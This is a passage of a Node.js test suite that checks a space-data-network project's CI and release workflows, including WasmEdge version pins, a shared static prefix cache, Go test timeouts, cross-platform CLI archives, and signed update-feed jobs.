// Review guard for accidental and careless workflow edits. A hostile branch can
// change this guard; the update-signing Environment, which admits only main, protects the key.
import test from 'node:test';
import yaml from 'js-yaml';
import assert from 'node:assert/strict';
import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), '../..');
const workflowPaths = [
  '.github/workflows/beta-release-artifacts.yml',
  '.github/workflows/ci.yml',
  '.github/workflows/docker-publish.yml',
  '.github/workflows/encryption-tests.yml',
  '.github/workflows/linux-vm-bundle.yml',
  '.github/workflows/npm-publish-sdn-js.yml',
  '.github/workflows/release-deploy.yml',
  '.github/workflows/security.yml',
];

function readRepoFile(relativePath) {
  return readFileSync(join(repoRoot, relativePath), 'utf8');
}

function extractShellFunction(script, functionName) {
  const escapedName = functionName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const header = new RegExp(`^${escapedName}\\(\\) \\{[ \\t]*$`, 'm').exec(script);

  assert.ok(header, `${functionName} must be defined as a shell function`);

  const bodyStart = header.index + header[0].length;
  const remainder = script.slice(bodyStart);
  const nextFunction = /^[_a-zA-Z][_a-zA-Z0-9]*\(\) \{[ \t]*$/m.exec(remainder);

  return remainder.slice(0, nextFunction?.index ?? remainder.length);
}

// Every Go lane calls `go test` through go_test_with_timings <label>, which
// hands the rest of its arguments to go-with-wasmedge.sh test unchanged (the
// Go-suites test asserts that too). A quoted "$VAR" argument is resolved from
// the script's top-level assignment, so a budget kept in a variable is
// asserted by its value; an unquoted package list stays as written.
function extractGoTestArguments(script, functionBody, functionName, count = 1) {
  const invocations = [...functionBody.matchAll(
    /^[ \t]*go_test_with_timings[ \t]+(.+?)[ \t]*\\?$/gm,
  )];

  assert.equal(invocations.length, count, `${functionName} must contain exactly ${count} active Go test invocations`);
  const parsed = invocations.map((invocation) => {
  const [, ...args] = invocation[1].split(/\s+/);
  return args.map((arg) => arg.replace(/"\$([A-Z_][A-Z0-9_]*)"/g, (_, name) => {
    const assignments = [...script.matchAll(new RegExp(`^${name}="([^"]*)"[ \\t]*$`, 'gm'))];
    assert.equal(assignments.length, 1, `${name} must be assigned a literal exactly once at the top level`);
    assert.doesNotMatch(assignments[0][1], /\$(?:[A-Za-z_0-9{(]|[?@*#!-])|`/, `${name} must not contain shell expansion`);
    return assignments[0][1];
  }));
  });
  return count === 1 ? parsed[0] : parsed;
}

// One `- name: <name>` step of a workflow or composite action, up to the next
// step at the same indent or the end of the enclosing list.
function extractYamlStep(text, name, indent) {
  const escapedName = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const starts = [...text.matchAll(new RegExp(`^${indent}- name: ${escapedName}[ \\t]*$`, 'gm'))];
  assert.equal(starts.length, 1, `exactly one step must be named "${name}"`);

  const start = starts[0].index;
  const rest = text.slice(start + starts[0][0].length);
  const end = new RegExp(`^(?:${indent}- | {0,${Math.max(indent.length - 1, 0)}}\\S)`, 'm').exec(rest);
  return text.slice(start, start + starts[0][0].length + (end?.index ?? rest.length));
}

function splitWorkflowJobs(workflow) {
  const jobsStart = /^jobs:[ \t]*$/m.exec(workflow);
  assert.ok(jobsStart, 'workflow must declare jobs');
  const body = workflow.slice(jobsStart.index + jobsStart[0].length);
  const headers = [...body.matchAll(/^ {2}([a-zA-Z0-9_-]+):[ \t]*$/gm)];
  return Object.fromEntries(headers.map((header, i) => [
    header[1],
    body.slice(header.index, headers[i + 1]?.index ?? body.length),
  ]));
}

// The ci-local.sh modes that reach prepare_go_toolchain, i.e. the ones that
// fail without a WASMEDGE_DIR holding WasmEdge headers and libraries.
function ciLocalModesNeedingWasmEdge(script) {
  const needing = new Set(
    [...script.matchAll(/^([_a-zA-Z][_a-zA-Z0-9]*)\(\) \{[ \t]*$/gm)]
      .map((header) => header[1])
      .filter((name) => name !== 'prepare_go_toolchain'
        && /^[ \t]+prepare_go_toolchain\b/m.test(extractShellFunction(script, name).split(/^case "\$MODE" in/m)[0])),
  );
  assert.ok(needing.size > 0, 'no ci-local.sh lane calls prepare_go_toolchain any more');

  const dispatch = /^case "\$MODE" in\n([\s\S]*?)^esac$/m.exec(script);
  assert.ok(dispatch, 'ci-local.sh must dispatch on $MODE');
  const modes = new Set();
  for (const arm of dispatch[1].matchAll(/^ {2}([a-z|-]+)\)([\s\S]*?);;$/gm)) {
    const calls = [...arm[2].matchAll(/(?:^|\n)[ \t]*([_a-zA-Z][_a-zA-Z0-9]*)\b/g)].map((call) => call[1]);
    if (calls.some((call) => needing.has(call))) {
      for (const mode of arm[1].split('|')) modes.add(mode);
    }
  }
  return modes;
}

test('workflows opt into Node 24 for GitHub actions and project scripts', () => {
  for (const workflowPath of workflowPaths) {
    const workflow = readRepoFile(workflowPath);

    assert.match(
      workflow,
      /FORCE_JAVASCRIPT_ACTIONS_TO_NODE24:\s*true/,
      `${workflowPath} must force JavaScript actions onto the Node 24 runtime`,
    );
    assert.doesNotMatch(
      workflow,
      /node-version:\s*['"]?20['"]?/,
      `${workflowPath} must not run project scripts on Node 20`,
    );
  }
});

// The release and CI share one patched prefix cache. Every runtime consumer
// downloads that run's artifact and requires the patches before executing.
test('CI Go jobs consume one release-compatible patched prefix', () => {
  const action = readRepoFile('.github/actions/sdn-go-env/action.yml');
  const workflow = readRepoFile('.github/workflows/ci.yml');
  const release = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  const script = readRepoFile('scripts/ci-local.sh');
  const jobs = splitWorkflowJobs(workflow);
  const producers = Object.entries(jobs).filter(([, body]) => /run: \.\/scripts\/ci-local\.sh prefix-build\s*$/m.test(body));
  assert.equal(producers.length, 1, 'exactly one job builds the prefix');
  const [producer, body] = producers[0];
  assert.match(body, /^    container: ubuntu:20\.04$/m);
  const key = /^          key: (wasmedge-static-.*)$/m.exec(body)?.[1];
  assert.ok(key, 'producer must cache the prefix');
  const releaseKeys = [...release.matchAll(/^          key: (wasmedge-static-.*)$/gm)].map((m) => m[1]);
  assert.ok(releaseKeys.includes(key), 'CI and release prefix keys must match exactly');
  assert.match(key, /linux-amd64-focal-llvm16/);
  const build = extractYamlStep(body, 'Build the static prefix', '      ');
  assert.match(build, /if: steps\.cache\.outputs\.cache-hit != 'true'/);
  assert.match(body, /uses: actions\/upload-artifact@v4\n        with:\n          name: wasmedge-static-prefix/);
  assert.equal((workflow.match(/name: wasmedge-static-prefix/g) || []).length, 1);

  const download = extractYamlStep(action, 'Download the shared patched prefix', '    ');
  const restore = extractYamlStep(action, 'Restore WasmEdge', '    ');
  const exported = extractYamlStep(action, 'Export WASMEDGE_DIR', '    ');
  assert.match(download, /uses: actions\/download-artifact@v4/);
  assert.match(download, /name: wasmedge-static-prefix/);
  assert.match(restore, /run: \.\/scripts\/ci-local\.sh prefix-unpack/);
  assert.match(exported, /echo "WASMEDGE_DIR=\$GITHUB_WORKSPACE\/\.sdn-wasmedge-static\/prefix" >> "\$GITHUB_ENV"/);
  assert.match(exported, /echo "SDN_WASM_REQUIRE_PATCHED=1" >> "\$GITHUB_ENV"/);
  for (const step of [download, restore, exported]) assert.doesNotMatch(step, /^ {6}if:/m);
  assert.ok(action.indexOf(download) < action.indexOf(restore) && action.indexOf(restore) < action.indexOf(exported));
  assert.doesNotMatch(workflow + action, /(?:run:|^)[^\n#]*install-wasmedge\.sh/m, 'CI must not install the stock library');

  const needsWasmEdge = ciLocalModesNeedingWasmEdge(script);
  for (const mode of ['go', 'heavy', 'builds', 'js', 'demo', 'dashboard', 'runtime', 'migrations', 'update-channel']) {
    assert.ok(needsWasmEdge.has(mode), `must discover the runtime dependency of ${mode}`);
  }
  function dependsOn(job, target, visited = new Set()) {
    if (visited.has(job)) return false;
    visited.add(job);
    const dependencies = /^    needs: ([a-z-]+)$/m.exec(jobs[job])?.[1];
    return dependencies === target || (dependencies && dependsOn(dependencies, target, visited));
  }
  let consumers = 0;
  for (const [job, body] of Object.entries(jobs)) {
    for (const run of body.matchAll(/^[ \t]+(?:run: )?\.\/scripts\/ci-local\.sh ([a-z-]+)[ \t]*$/gm)) {
      if (!needsWasmEdge.has(run[1])) continue;
      consumers++;
      assert.match(body, /^    container: ubuntu:20\.04$|^    container:\n      image: ubuntu:20\.04$/m, `${job} must test the release C library and linker`);
      const setup = /^ {6}- uses: \.\/\.github\/actions\/sdn-go-env[ \t]*$/m.exec(body);
      assert.ok(setup && setup.index < run.index, `${job} must restore the prefix before ${run[1]}`);
      assert.ok(dependsOn(job, producer), `${job} must wait for the prefix producer`);
      if (run[1] !== 'runtime') assert.ok(dependsOn(job, 'wasmedge-runtime'), `${job} must wait for the release-container self-test`);
      assert.doesNotMatch(body, /^[ \t]+(?:WASMEDGE_DIR|SDN_WASM_REQUIRE_PATCHED):/m, `${job} must preserve the shared runtime environment`);
    }
  }
  assert.ok(consumers >= 9, 'all runtime consumers must be checked');
});

test('local Go suites serialize package builds while bypassing the test cache', () => {
  const script = readRepoFile('scripts/ci-local.sh');

  // The lanes reach go test through go_test_with_timings, so what they pass it
  // is only what go test gets if the wrapper forwards every argument, once,
  // and keeps go test's exit status rather than tee's.
  const wrapper = extractShellFunction(script, 'go_test_with_timings');
  assert.equal(
    [...wrapper.matchAll(/^[ \t]*"\$ROOT\/scripts\/go-with-wasmedge\.sh"[ \t]+test[ \t]+"\$@"(?=[ \t|])/gm)].length,
    1,
    'go_test_with_timings must pass its arguments to exactly one active Go test invocation',
  );
  assert.match(wrapper, /^[ \t]*rc=\$\{PIPESTATUS\[0\]\}[ \t]*$/m, 'go_test_with_timings must keep go test\'s exit status');
  assert.match(wrapper, /^[ \t]*return "\$rc"[ \t]*$/m, 'go_test_with_timings must return go test\'s exit status');

  const goArgs = extractGoTestArguments(script, extractShellFunction(script, 'run_go'), 'run_go');
  const raceArgs = extractGoTestArguments(script, extractShellFunction(script, 'run_go_race'), 'run_go_race');

  for (const [functionName, args] of [['run_go', goArgs], ['run_go_race', raceArgs]]) {
    assert.ok(args.includes('-p=1'), `${functionName} must serialize package builds with -p=1`);
    assert.ok(args.includes('-count=1'), `${functionName} must bypass cached results`);
  }

  // run_go no longer runs ./... — the record store is split into run_go_heavy,
  // its own CI job. That is only safe if the set it excludes is genuinely run
  // somewhere, so assert BOTH halves exist and that nothing is quietly dropped
  // between them.
  assert.ok(
    goArgs.at(-1) === '$pkgs',
    'run_go must run the filtered package list, not ./...',
  );
  assert.match(script, /pkgs=\$\([^)]*list \.\/\.\.\.[^)]*grep -Ev "\$\(heavy_pkg_filter\)"/);
  const heavyBody = extractShellFunction(script, 'run_go_heavy');
  const [longArgs, heavyArgs] = extractGoTestArguments(script, heavyBody, 'run_go_heavy', 2);
  assert.ok(longArgs.includes('-p=1'), 'isolated scale tests must serialize package builds');
  assert.ok(longArgs.includes('-count=1'), 'isolated scale tests must bypass cached results');
  assert.deepEqual(longArgs.filter((arg) => arg.startsWith('-timeout=')), ['-timeout=60m']);
  assert.deepEqual(longArgs.slice(-3), ['"$pkg"', '||', 'failed=1']);
  assert.ok(heavyArgs.includes('-p=1'), 'run_go_heavy must serialize package builds');
  assert.ok(heavyArgs.includes('-count=1'), 'run_go_heavy must bypass cached results');
  // The ordinary groups retain 25m. The complete scale exercise has its
  // own measured budget in a group of its own.
  assert.deepEqual(
    heavyArgs.filter((arg) => arg.startsWith('-timeout=')),
    ['-timeout=25m'],
    'run_go_heavy must carry the long budget the heavy packages were split out for',
  );
  // And go test must hit that budget before the CI job's own timeout kills the
  // runner, so an overrun names the running test instead of vanishing.
  const heavyJob = splitWorkflowJobs(readRepoFile('.github/workflows/ci.yml'))['go-heavy'];
  assert.ok(heavyJob, 'CI must keep a go-heavy job for the record store');
  assert.match(heavyJob, /^ {8}run: \.\/scripts\/ci-local\.sh heavy[ \t]*$/m, 'the go-heavy job must run the heavy lane');
  const heavyJobMinutes = Number(/^ {4}timeout-minutes: (\d+)[ \t]*$/m.exec(heavyJob)?.[1]);
  assert.ok(heavyJobMinutes > 60 + 25, 'the job must exceed both sequential test budgets');
  // The CI matrix runs exactly the groups run_go_heavy defines (long, each
  // HEAVY_GO_GROUPS name, rest), each once: a group missing from the matrix
  // would be tests no CI job runs.
  const heavyGroups = /^HEAVY_GO_GROUPS="([^"]*)"[ \t]*$/m.exec(script)?.[1];
  assert.ok(heavyGroups, 'HEAVY_GO_GROUPS must be assigned a literal');
  const groupNames = ['long', ...heavyGroups.split(/\s+/).map((def) => def.split(':')[0]), 'rest'];
  const matrixGroups = /^ {8}group: \[([^\]]*)\][ \t]*$/m.exec(heavyJob)?.[1]?.split(',').map((name) => name.trim());
  assert.deepEqual(matrixGroups, groupNames, 'the go-heavy matrix must list every record store group once');
  assert.match(heavyJob, /^ {6}SDN_CI_STORAGE_GROUP: \$\{\{ matrix\.group \}\}[ \t]*$/m, 'each go-heavy job must select its group');
  // Unset, the remaining record-store tests run as background groups. The
  // execution coverage suite also includes the isolated scale exercise.
  assert.deepEqual(
    heavyArgs.slice(-2),
    ['"$pkg"', '&'],
    'run_go_heavy must run one heavy package per invocation, as a background group',
  );
  assert.equal(
    [...heavyBody.matchAll(/^[ \t]*for pkg in \$HEAVY_GO_PACKAGES; do[ \t]*$/gm)].length,
    1,
    'run_go_heavy must run exactly the set heavy_pkg_filter excludes',
  );
  assert.deepEqual(raceArgs.at(-1), './...', 'run_go_race still covers the whole module');

  assert.deepEqual(
    goArgs.filter((arg) => arg.startsWith('-timeout=')),
    ['-timeout=10m'],
    'run_go must have exactly one explicit 10-minute per-package timeout, sized from the warm-engine measurement',
  );
  assert.deepEqual(
    raceArgs.filter((arg) => arg.startsWith('-timeout=')),
    ['-timeout=30m'],
    'run_go_race must have exactly one explicit 30-minute timeout for serialized race builds',
  );
  assert.ok(raceArgs.includes('-race'), 'run_go_race must retain Go race detection');
});

test('beta release workflow publishes public beta artifacts', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  const license = readRepoFile('LICENSE');

  assert.match(workflow, /name:\s*SDN Beta Release Artifacts/);
  assert.match(workflow, /workflow_dispatch:/);
  assert.match(workflow, /prepare-beta-release\.mjs/);
  assert.match(workflow, /assemble-beta-release-artifacts\.sh/);
  assert.match(workflow, /native_package_version/);
  assert.match(workflow, /npm pack --pack-destination/);
  assert.match(workflow, /artifact-docker-test:/);
  assert.match(workflow, /test:release-artifacts:docker/);
  assert.match(workflow, /container-image/);
  assert.match(workflow, /docker save/);
  // Per architecture now: the image is published as a multi-architecture
  // manifest, so `docker pull` on Apple Silicon and on ARM servers stops
  // resolving to an amd64 image run under emulation.
  assert.match(workflow, /spacedatanetwork-container-\$\{NATIVE_PACKAGE_VERSION\}-linux-\$\{\{ matrix\.arch \}\}\.tar\.gz/);
  assert.match(workflow, /arch:\s*amd64[\s\S]*?runner:\s*ubuntu-latest/);
  assert.match(workflow, /arch:\s*arm64[\s\S]*?runner:\s*ubuntu-24\.04-arm/);
  // Tags belong to the manifest, never to a single-architecture push.
  assert.match(workflow, /docker-manifest:/);
  assert.match(workflow, /push-by-digest=true/);
  assert.match(workflow, /docker buildx imagetools create/);
  assert.match(workflow, /Build self-contained CLI archives/);
  assert.match(workflow, /build-self-contained-cli\.mjs/);
  assert.match(workflow, /--hd-wallet-wasm-path "\$\{PWD\}\/node_modules\/hd-wallet-wasm\/dist\/hd-wallet-wasi\.wasm"/);
  assert.match(workflow, /--license-path "\$\{PWD\}\/LICENSE"/);
  assert.match(license, /MIT License/);
  // The owner re-attributed the copyright on 2026-09-25 (ffb562e13).
  assert.match(license, /^Copyright \(c\) \d{4} Edgesource Corporation$/m);
  assert.match(workflow, /spacedatanetwork-\$\{\{ needs\.beta-version\.outputs\.package_version \}\}-\$\{\{ matrix\.target_os \}\}-\$\{\{ matrix\.target_arch \}\}\.\$\{\{ matrix\.archive_extension \}\}/);
  assert.match(workflow, /name:\s*cli-\$\{\{ matrix\.target_os \}\}-\$\{\{ matrix\.target_arch \}\}/);
  assert.match(workflow, /pattern:\s*cli-\*/);
  assert.match(workflow, /merge-multiple:\s*true/);
  assert.match(workflow, /prerelease:\s*false/);
  assert.match(workflow, /make_latest:\s*true/);
  // Existing notes on a release published before its assets are kept.
  assert.match(workflow, /body_path: dist\/release\/SDN-BETA-RELEASE\.md[\s\S]*?append_body: true[\s\S]*?make_latest: true/);
  assert.match(workflow, /release_name/);
  assert.match(workflow, /docker\.io/);
  assert.match(workflow, /dockerdigitalarsenal\/space-data-network/);
  assert.match(workflow, /beta/);
  assert.doesNotMatch(workflow, /Dockerfile\.full/);
  assert.doesNotMatch(workflow, /Dockerfile\.edge/);
  assert.doesNotMatch(workflow, /space-data-network-full/);
  assert.doesNotMatch(workflow, /space-data-network-edge/);
});

test('IPFS asset release script skips browser downloads and bounds dependency installs', () => {
  const script = readRepoFile('deployment/ipfs/ipfs-deploy.sh');

  assert.match(script, /PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD/);
  assert.match(script, /PUPPETEER_SKIP_DOWNLOAD/);
  assert.match(script, /CYPRESS_INSTALL_BINARY/);
  assert.match(script, /run_with_timeout/);
  assert.match(script, /WEBUI_NPM_CI_TIMEOUT_SECONDS/);
  assert.match(script, /npm ci --no-audit --fund=false/);
  assert.match(script, /log "Installing IPFS WebUI dependencies"/);
});

// The published-deps law: a build consumes PUBLISHED packages, never a local
// gitlink copy. This test used to assert the OPPOSITE — that the Dockerfile
// staged a `replace` onto sdn-server/third_party/spacedatastandards-go before
// `go mod download`. That replacement is gone (SDS is required at a real
// version), so the guarantee worth holding is that it does not come back: a
// replace directive would make the released image build from whatever happened
// to be in the working tree.
// The one kind of replace go.mod may carry is Kubo's own: Kubo builds against
// a pinned module (its go.mod says why), replace directives reach only the
// main module, and scripts/check-kubo-pin.js holds SDN's copy equal to
// Kubo's. A replacement onto a local path is what this test forbids: the
// release image would build something nobody can fetch.
test('Docker release image builds against published Go modules, never a local replacement', () => {
  const goMod = readRepoFile('sdn-server/go.mod');

  const localReplaces = goMod
    .split('\n')
    .map((line) => line.trim())
    .filter((line) => !line.startsWith('//') && line.includes('=>'))
    .filter((line) => /=>\s*(\.{1,2}\/|\/)/.test(line));
  assert.deepEqual(localReplaces, [], 'sdn-server/go.mod must replace nothing with a local path');
  assert.match(
    goMod,
    /github\.com\/DigitalArsenal\/spacedatastandards\.org\/lib\/go v\d+\.\d+\.\d+/,
    'SDS must be required at a published version',
  );
});

// The AOT cache is keyed on the engine bytes AND the libwasmedge version, and a
// miss does not fail — it silently falls back to the ~100x interpreter, which
// has taken production down twice (memory: host01-aot-artifact-drift-recovery).
// So every lane that builds a shipped artifact must install the SAME WasmEdge:
// scripts/install-wasmedge.sh is the one pin, and the workflows had drifted two
// minor versions behind it (0.14.0 vs 0.16.4) while the release cutter and the
// Docker image were on 0.16.4.
test('every workflow installs the WasmEdge the release cutter and Docker image use', () => {
  const installer = readRepoFile('scripts/install-wasmedge.sh');
  const canonical = /WASMEDGE_VERSION="\$\{WASMEDGE_VERSION:-([0-9.]+)\}"/.exec(installer);
  assert.ok(canonical, 'scripts/install-wasmedge.sh must declare the default WasmEdge version');
  const pin = canonical[1];

  const cutter = readRepoFile('deployment/release/cut-release-local.sh');
  assert.match(
    cutter,
    new RegExp(`WASMEDGE_VERSION:-${pin.replaceAll('.', '\\.')}\\}`),
    'the release cutter must use the canonical WasmEdge pin',
  );

  for (const workflow of ['beta-release-artifacts.yml', 'live-dht-cross-platform.yml', 'ci.yml']) {
    const text = readRepoFile(`.github/workflows/${workflow}`);
    const declared = [...text.matchAll(/^\s*WASMEDGE_VERSION:\s*[\x27\x22]?([0-9.]+)[\x27\x22]?\s*$/gm)].map((m) => m[1]);
    assert.deepEqual(
      [...new Set(declared)],
      [pin],
      `${workflow} must pin WasmEdge ${pin}, the version install-wasmedge.sh installs`,
    );
  }
});

test('Docker release builder Go version matches the server module Go directive', () => {
  const dockerfile = readRepoFile('deployment/docker/Dockerfile');
  const goMod = readRepoFile('sdn-server/go.mod');
  const builderVersion = /^FROM\s+golang:(\d+)\.(\d+)(?:\.\d+)?(?:-[^\s]+)?\s+AS\s+builder\s*$/im.exec(dockerfile);
  const moduleVersion = /^go\s+(\d+)\.(\d+)(?:\.\d+)?\s*$/m.exec(goMod);

  assert.ok(builderVersion, 'Dockerfile must declare a versioned golang builder image');
  assert.ok(moduleVersion, 'sdn-server/go.mod must declare a Go version');
  assert.equal(
    `${builderVersion[1]}.${builderVersion[2]}`,
    `${moduleVersion[1]}.${moduleVersion[2]}`,
    'Docker builder Go major.minor must match the sdn-server module Go major.minor',
  );
});

test('beta release workflow builds updater wasm once before platform CLI archives', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  assert.match(workflow, /updater-wasm:\s*\n\s*name:\s*Build updater module wasm/);
  // The module's own lockfile pins its build tools (esbuild, the SDK); the
  // root tree no longer carries them.
  const updaterJob = workflow.slice(workflow.indexOf('  updater-wasm:'), workflow.indexOf('  docker:'));
  assert.match(updaterJob, /npm --prefix packages\/sdn-updater-module ci[\s\S]*npm --prefix packages\/sdn-updater-module run build/);
  // The SDK compiles with clang for wasm32-wasip1-threads: a pinned wasi-sdk,
  // checked by sha256, reaches it through the SDN_WASI_* overrides first.
  assert.match(updaterJob, /WASI_SDK_SHA256: [0-9a-f]{64}\n/);
  assert.match(updaterJob, /sha256sum -c -/);
  assert.match(updaterJob, /SDN_WASI_CLANGXX=[\s\S]*SDN_WASI_SYSROOT=[\s\S]*npm --prefix packages\/sdn-updater-module run build/);
  assert.match(workflow, /name:\s*updater-module-wasm[\s\S]*path:\s*packages\/sdn-updater-module\/dist\/isomorphic\/module\.wasm/);
  assert.match(workflow, /needs:\s*\[beta-version, update-signing-check, ipfs, updater-wasm, wasmedge-static, cli-js-inputs\]/);
  assert.match(workflow, /name:\s*updater-module-wasm[\s\S]*path:\s*packages\/sdn-updater-module\/dist\/isomorphic/);
  assert.match(workflow, /name:\s*Verify updater module wasm[\s\S]*test -f packages\/sdn-updater-module\/dist\/isomorphic\/module\.wasm/);

  const cliJob = workflow.slice(workflow.indexOf('  cli:'), workflow.indexOf('  packages:'));
  assert.doesNotMatch(cliJob, /name:\s*Build updater module wasm/);
});

test('beta release workflow builds every required portable CLI target', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  for (const target of [
    { os: 'linux', arch: 'amd64', archive: 'tar.gz' },
    { os: 'linux', arch: 'arm64', archive: 'tar.gz' },
    { os: 'darwin', arch: 'arm64', archive: 'tar.gz' },
    { os: 'darwin', arch: 'amd64', archive: 'tar.gz' },
    { os: 'windows', arch: 'amd64', archive: 'zip' },
  ]) {
    assert.match(
      workflow,
      new RegExp(`target_os:\\s*${target.os}[\\s\\S]*target_arch:\\s*${target.arch}[\\s\\S]*archive_extension:\\s*${target.archive}`),
      `${target.os}-${target.arch} must declare ${target.archive} as its portable CLI archive extension`,
    );
  }
});

// The bundles carry no Kubo: it is linked into the node binary. The one Kubo
// download left is the ipfs CLI the asset-pinning job runs as a build tool.
test('beta release workflow downloads only the ipfs build tool, with retries and validation', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
  const downloaderPath = 'deployment/release/download-kubo.sh';

  assert.equal(existsSync(join(repoRoot, downloaderPath)), true);

  const downloader = readRepoFile(downloaderPath);

  assert.match(workflow, /deployment\/release\/download-kubo\.sh[\s\S]*--platform linux-amd64[\s\S]*--archive tar\.gz/);
  assert.doesNotMatch(workflow, /KUBO_PLATFORM|--kubo-path|dist\/kubo\//);
  assert.doesNotMatch(workflow, /curl -L https:\/\/dist\.ipfs\.tech\/kubo\/\$\{KUBO_VERSION\}\/kubo_\$\{KUBO_VERSION\}_linux-amd64\.tar\.gz \| tar/);
  assert.doesNotMatch(workflow, /curl -L "https:\/\/dist\.ipfs\.tech\/kubo\/\$\{KUBO_VERSION\}\/kubo_\$\{KUBO_VERSION\}_\$\{KUBO_PLATFORM\}\.tar\.gz" \| tar/);
  assert.match(downloader, /curl -fL/);
  assert.match(downloader, /--retry-all-errors/);
  assert.match(downloader, /tar -tzf/);
  assert.match(downloader, /unzip -tq/);
  // dist.ipfs.tech has gone down twice; Kubo's GitHub release is the fallback,
  // and only with the sha512 GitHub publishes beside each asset.
  assert.match(downloader, /https:\/\/github\.com\/ipfs\/kubo\/releases\/download/);
  assert.match(downloader, /\$\{mirror_url\}\.sha512/);
  assert.match(downloader, /"\$\{expected\}" == "\$\{actual\}"/);
});

test('no web UI install runs the kubo devDependency download', () => {
  // Its postinstall fetches from dist.ipfs.tech, which only the e2e tests
  // need; every release-lane install skips scripts and runs patch-package.
  for (const [path, text] of [
    ['deployment/ipfs/ipfs-deploy.sh', readRepoFile('deployment/ipfs/ipfs-deploy.sh')],
    ['.github/workflows/docker-publish.yml', readRepoFile('.github/workflows/docker-publish.yml')],
  ]) {
    assert.match(text, /npm ci --no-audit --fund=false --ignore-scripts/, path);
    assert.match(text, /npm run postinstall/, path);
  }
});

test('every CLI target links WasmEdge in and ships no runtime beside the binary', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  assert.match(workflow, /target_os:\s*windows[\s\S]*runner:\s*windows-latest/);

  // Windows used to be the exception, shipping wasmedge.dll next to the exe.
  // It is not any more: all five targets restore a static prefix and link the
  // runtime into the executable. Nothing may download or stage a DLL, and
  // nothing may pass --wasmedge-path, which is what tells the bundler to put a
  // runtime in the archive.
  assert.doesNotMatch(workflow, /wasmedge\.dll/);
  assert.doesNotMatch(workflow, /WasmEdge-\$\{WASMEDGE_VERSION\}-(windows|Windows)/);
  assert.doesNotMatch(workflow, /--wasmedge-path/);

  const cliJob = workflow.slice(workflow.indexOf('  cli:'), workflow.indexOf('  cli-update-feed:'));
  assert.match(cliJob, /name:\s*Restore the static WasmEdge prefix[\s\S]*fail-on-cache-miss:\s*true/);
  assert.match(cliJob, /go-with-wasmedge\.sh build -o/);

  // GNU ld dies on the Windows link (exit 5, run 43646565818); lld links it.
  // Windows only, after the prefix is restored and before the build.
  assert.match(cliJob, /install: >-[\s\S]*?mingw-w64-x86_64-lld[\s\S]*?- name: Install Windows CLI build tools/);
  const lld = /- name: Link the Windows CLI with lld\n\s+if: matrix\.target_os == 'windows'\n\s+run: \|\n\s+printf ' -fuse-ld=lld' >> "\$\{WASMEDGE_DIR\}\/link\.flags"/;
  assert.match(cliJob, lld);
  const at = (name) => cliJob.indexOf(`- name: ${name}`);
  assert.ok(at('Restore the static WasmEdge prefix') < at('Link the Windows CLI with lld'));
  assert.ok(at('Link the Windows CLI with lld') < at('Build target SDN binary'));
});

test('the static WasmEdge cache key covers everything that shapes a prefix', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  // Three separate outages came from a fix that landed but never ran, because a
  // prefix built by older code stayed in the cache. The key must therefore move
  // whenever the build script, the toolchain-selection script, or the installed
  // package set (tagged by matrix.toolchain, since no hashFiles can see an
  // action's literal inputs) changes.
  // The valid tags come from the matrix itself, not a list written here — a
  // hardcoded list is the same staleness this test exists to catch, and it did
  // go stale the first time the Linux toolchain moved.
  const declared = [...workflow.matchAll(/^\s*toolchain:\s*([\w.-]+)\s*$/gm)].map((m) => m[1]);
  assert(declared.length > 0, 'no matrix entry declares a toolchain tag');
  const tags = [...new Set(declared)];

  const keys = [...workflow.matchAll(/key:\s*(wasmedge-static-[^\n]*)/g)].map((m) => m[1]);
  assert(keys.length >= 4, `expected every consumer to name the key, saw ${keys.length}`);
  for (const key of keys) {
    assert.match(key, /hashFiles\('scripts\/build-static-wasmedge\.sh', 'scripts\/wasmedge-static-env\.sh'\)/);
    const named = key.includes('matrix.toolchain') || tags.some((tag) => key.includes(tag));
    assert(named, `key names no declared toolchain (${tags.join(', ')}): ${key}`);
  }

  // Hashing the whole workflow was the previous, far too broad answer: it threw
  // away five prefixes and rebuilt LLVM on five runners for an edit to an
  // unrelated job.
  assert.doesNotMatch(workflow, /hashFiles\([^)]*beta-release-artifacts\.yml[^)]*\)/);
});

test('beta release workflow builds signed CLI update feed artifacts', () => {
  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');

  assert.match(workflow, /cli-update-payloads:\s*\n\s*name:\s*Build CLI update payloads\n\s*runs-on: ubuntu-latest\n\s*needs:\s*\[beta-version, cli\]/);
  assert.match(workflow, /cli-update-feed:\s*\n\s*name:\s*Build signed CLI update feed\n\s*runs-on: ubuntu-latest\n\s*needs:\s*\[beta-version, cli-update-payloads\]/);
  assert.match(workflow, /cli-update-feed-verify:\s*\n\s*name:\s*Verify the signed CLI update feed\n\s*runs-on: ubuntu-latest\n\s*needs:\s*\[beta-version, cli-update-feed\]/);
  assert.match(workflow, /sign-cli-update-payload\.mjs/);
  assert.match(workflow, /SDN_UPDATE_SIGNING_KEY_PEM:\s*\$\{\{ secrets\.SDN_UPDATE_SIGNING_KEY_PEM \}\}/);
  assert.match(workflow, /SDN_UPDATE_KEY_ID:\s*\$\{\{ secrets\.SDN_UPDATE_KEY_ID \}\}/);
  assert.match(workflow, /SDN_UPDATE_SEQUENCE:\s*\$\{\{ github\.run_number \}\}/);
  assert.match(workflow, /build-cli-update-payload\.mjs/);
  assert.match(workflow, /build-sdn-update-feed\.js/);
  assert.match(workflow, /spacedatanetwork-update-feed-\$\{VERSION\}\.tar\.gz/);
  assert.match(workflow, /name:\s*cli-update-feed[\s\S]*path:\s*dist\/update-feed\/spacedatanetwork-update-feed-\$\{\{ needs\.beta-version\.outputs\.package_version \}\}\.tar\.gz/);
  assert.match(workflow, /name:\s*cli-update-feed[\s\S]*path:\s*dist\/update-feed/);
  assert.match(workflow, /artifact-docker-test:[\s\S]*?needs:\s*\[beta-version, ipfs, packages\]/);
